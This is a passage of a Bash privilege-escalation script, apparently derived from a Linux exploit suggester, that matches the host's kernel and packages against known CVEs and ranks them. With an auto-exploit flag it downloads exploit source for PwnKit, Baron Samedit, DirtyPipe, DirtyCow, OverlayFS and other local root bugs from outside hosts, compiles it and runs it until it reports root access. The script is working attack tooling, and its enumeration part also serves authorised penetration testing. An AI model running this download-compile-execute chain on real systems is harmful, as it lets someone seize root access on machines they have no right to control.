[ -n "$KERNEL" ] && echo -e "  Kernel  : ${txtgrn}${KERNEL}${txtrst}" || echo -e "  Kernel  : ${txtred}N/A${txtrst}"
echo -e "  Arch    : $([ -n "$ARCH" ] && echo -e "${txtgrn}${ARCH}${txtrst}" || echo -e "${txtred}N/A${txtrst}")"
echo -e "  Distro  : $([ -n "$OS" ] && echo -e "${txtgrn}${OS} ${DISTRO}${txtrst}" || echo -e "${txtred}N/A${txtrst}")"
echo

if [ "$opt_kernel_only" = "true" -o -z "$PKG_LIST" ]; then
    unset EXPLOITS_USERSPACE; declare -a EXPLOITS_USERSPACE
fi

if [ "$opt_userspace_only" = "true" ]; then
    unset EXPLOITS; declare -a EXPLOITS
fi

echo -e "${bldwht}[ Detected Vulnerable CVEs ]${txtrst}"
echo

j=0
for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do
    i=0
    while read -r line; do
        arr[i]="$line"
        i=$((i + 1))
    done <<< "$EXP"
    NAME="${arr[0]}" && NAME="${NAME:6}"
    REQS="${arr[1]}" && REQS="${REQS:6}"
    TAGS="${arr[2]}" && TAGS="${TAGS:6}"
    RANK="${arr[3]}" && RANK="${RANK:6}"
    IFS=',' read -r -a array <<< "$REQS"
    REQS_NUM=${#array[@]}
    PASSED_REQ=0
    for REQ in "${array[@]}"; do
        if (checkRequirement "$REQ" "${array[0]}"); then
            PASSED_REQ=$(($PASSED_REQ + 1))
        else
            break
        fi
    done
    if [ $PASSED_REQ -eq $REQS_NUM ]; then
        if [ "$opt_cvelist_file" = "true" ]; then
            cve=$(echo "$NAME" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "," "|")
            [ ! $(cat "$CVELIST_FILE" | grep -E "$cve") ] && continue
        fi
        tags=""
        if [ -n "$TAGS" -a -n "$OS" ]; then
            IFS=',' read -r -a tags_array <<< "$TAGS"
            [ "$(echo "${tags_array[@]}" | grep "$OS")" -a "$opt_uname_string" == "true" ] && RANK=$(($RANK + 1))
            for TAG in "${tags_array[@]}"; do
                tag_distro=$(echo "$TAG" | cut -d'=' -f1)
                tag_distro_num_all=$(echo "$TAG" | cut -d'=' -f2)
                tag_distro_num="${tag_distro_num_all%{*}"
                if [ "$opt_uname_string" == "true" -o \( "$OS" == "$tag_distro" -a "$(echo "$DISTRO" | grep -E "$tag_distro_num")" \) ]; then
                    [ "$opt_uname_string" == "false" ] && RANK=$(($RANK + 2))
                    tag_pkg=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 1)
                    tag_pkg_num=""
                    [ $(echo "$tag_distro_num_all" | grep '{') ] && tag_pkg_num=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 2)
                    if [ -z "$tag_pkg_num" ]; then
                        [ "$opt_uname_string" == "false" ] && TAG="${lightyellow}[ ${TAG} ]${txtrst}"
                    elif [ -n "$tag_pkg_num" -a "$tag_pkg" = "kernel" ]; then
                        if [ $(echo "$KERNEL_ALL" | grep -E "${tag_pkg_num}") ]; then
                            TAG="${yellow}[ ${TAG} ]${txtrst}"; RANK=$(($RANK + 3))
                        else
                            [ "$opt_uname_string" == "false" ] && TAG="${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{kernel:$tag_pkg_num}"
                        fi
                    elif [ -n "$tag_pkg_num" -a -n "$tag_pkg" ]; then
                        TAG="${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{$tag_pkg:$tag_pkg_num}"
                    fi
                fi
                tags="${tags}${TAG},"
            done
            [ -n "$tags" ] && tags="${tags%?}"
        else
            tags="$TAGS"
        fi
        EXP=$(echo "$EXP" | sed -e '/^Name:/d' -e '/^Reqs:/d' -e '/^Tags:/d')
        exploits_to_sort[j]="${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo "$EXP" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g')"
        ((j++))
    fi
done

IFS=$'\n'
SORTED_EXPLOITS=($(sort -r <<<"${exploits_to_sort[*]}" 2>/dev/null))
unset IFS

for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; do
    RANK=$(echo "$EXP_TEMP" | awk -F'Name:' '{print $1}')
    EXP=$(echo "$EXP_TEMP" | sed 's/^[0-9]//g' | sed 's/D3L1m/\n/g')
    i=0
    while read -r line; do
        arr[i]="$line"
        i=$((i + 1))
    done <<< "$EXP"
    NAME="${arr[0]}" && NAME="${NAME:6}"
    REQS="${arr[1]}" && REQS="${REQS:6}"
    TAGS="${arr[2]}" && tags="${TAGS:6}"
    EXPLOIT_DB=$(echo "$EXP" | grep "exploit-db: " | awk '{print $2}')
    analysis_url=$(echo "$EXP" | grep "analysis-url: " | awk '{print $2}')
    ext_url=$(echo "$EXP" | grep "ext-url: " | awk '{print $2}')
    comments=$(echo "$EXP" | grep "Comments: " | cut -d' ' -f 2-)
    name=$(echo "$NAME" | cut -d' ' -f 2- | tr -d ' ()/')
    bin_url=$(echo "$EXP" | grep "bin-url: " | awk '{print $2}')
    src_url=$(echo "$EXP" | grep "src-url: " | awk '{print $2}')
    [ -z "$src_url" ] && [ -n "$EXPLOIT_DB" ] && src_url="https://www.exploit-db.com/download/$EXPLOIT_DB"

    dos=$(echo "$EXP" | grep -o -i "(dos")
    [ "$opt_show_dos" == "false" -a -n "$dos" ] && continue

    echo -e "  ${txtred}[VULNERABLE]${txtrst}  $NAME"

    # ---- AUTO-EXPLOIT attempts (only if -e flag) ----
    [ "$_ROOT_ACHIEVED" = "true" ] && continue
    [ "$opt_auto_exploit" != "true" ] && continue

    if echo "$NAME" | grep -q "CVE-2021-4034"; then
        _compile_and_run "CVE-2021-4034 (PwnKit)" \
            "https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/CVE-2021-4034.c" \
            "pwnkit.c" "gcc pwnkit.c -o pwnkit" "./pwnkit"
    fi

    if echo "$NAME" | grep -q "CVE-2021-3156"; then
        _compile_and_run "CVE-2021-3156 (Baron Samedit)" \
            "https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit.c" \
            "baron_samedit.c" "gcc baron_samedit.c -o baron_samedit -lutil" "./baron_samedit"
    fi

    if echo "$NAME" | grep -q "CVE-2022-0847" && echo "$NAME" | grep -qv "CVE-2021"; then
        _compile_and_run "CVE-2022-0847 (DirtyPipe)" \
            "https://haxx.in/files/dirtypipez.c" \
            "dirtypipez.c" "gcc dirtypipez.c -o dirtypipez -lpthread" "./dirtypipez"
    fi

    if echo "$NAME" | grep -q "CVE-2021-3493"; then
        _compile_and_run "CVE-2021-3493 (OverlayFS)" \
            "https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c" \
            "cve_3493.c" "gcc cve_3493.c -o cve_3493" "./cve_3493"
    fi

    if echo "$NAME" | grep -q "CVE-2017-16995"; then
        _compile_and_run "CVE-2017-16995 (eBPF)" \
            "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/exploits/cve-2017-16995/exploit.c" \
            "cve_16995.c" "gcc cve_16995.c -o cve_16995" "./cve_16995"
    fi

    if echo "$NAME" | grep -q "CVE-2016-5195"; then
        _compile_and_run "CVE-2016-5195 (DirtyCow)" \
            "https://www.exploit-db.com/download/40839" \
            "dirtycow.c" "gcc -pthread dirtycow.c -o dirtycow -lcrypt" "./dirtycow"
    fi

    if echo "$NAME" | grep -q "CVE-2025-7771"; then
        _compile_and_run "CVE-2025-7771" \
            "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2025-7771/exploit.c" \
            "exploit_7771.c" "gcc -static exploit_7771.c -o exploit_7771" "./exploit_7771"
    fi

    if echo "$NAME" | grep -q "CVE-2026-31431"; then
        _compile_and_run "CVE-2026-31431 (Copy Fail)" \
            "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-31431/exploit.c" \
            "exploit_31431.c" "gcc -static exploit_31431.c -o exploit_31431" "./exploit_31431"
    fi

    if echo "$NAME" | grep -q "CVE-2026-43500"; then
        _compile_and_run "CVE-2026-43500 (Dirty Frag)" \
            "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/refs/heads/main/CVE-2026-43500/poc.c" \
            "poc_43500.c" "gcc -O0 -Wall -o poc_43500 poc_43500.c -lutil" "./poc_43500"
    fi

    if echo "$NAME" | grep -q "CVE-2019-13272"; then
        _compile_and_run "CVE-2019-13272 (PTRACE_TRACEME)" \
            "https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" \
            "pt_13272.c" "gcc pt_13272.c -o pt_13272 -std=gnu99" "./pt_13272"
    fi

    if echo "$NAME" | grep -q "CVE-2017-7308"; then
        _compile_and_run "CVE-2017-7308 (af_packet)" \
            "https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c" \
            "cve_7308.c" "gcc cve_7308.c -o cve_7308" "./cve_7308"
    fi

    if echo "$NAME" | grep -q "CVE-2022-2586"; then
        _compile_and_run "CVE-2022-2586 (nft_object UAF)" \
            "https://www.openwall.com/lists/oss-security/2022/08/29/5/1" \
            "exp_2586.c" "gcc exp_2586.c -o exp_2586 -lnftnl -lmnl" "./exp_2586" "libnftnl-dev libmnl-dev"
    fi

    if echo "$NAME" | grep -q "CVE-2023-0386"; then
        _compile_and_run "CVE-2023-0386 (OverlayFS LPE)" \
            "https://raw.githubusercontent.com/xkaneiki/CVE-2023-0386/main/exploit.c" \
            "cve_0386.c" "gcc cve_0386.c -o cve_0386 -lcap" "./cve_0386" "libcap-dev"
    fi
done

# If auto-exploit ran but root not achieved, show a summary
if [ "$_ROOT_ACHIEVED" = "true" ]; then
    echo
    echo -e "${txtgrn}[+] Privilege escalation successful!${txtrst}"
fi
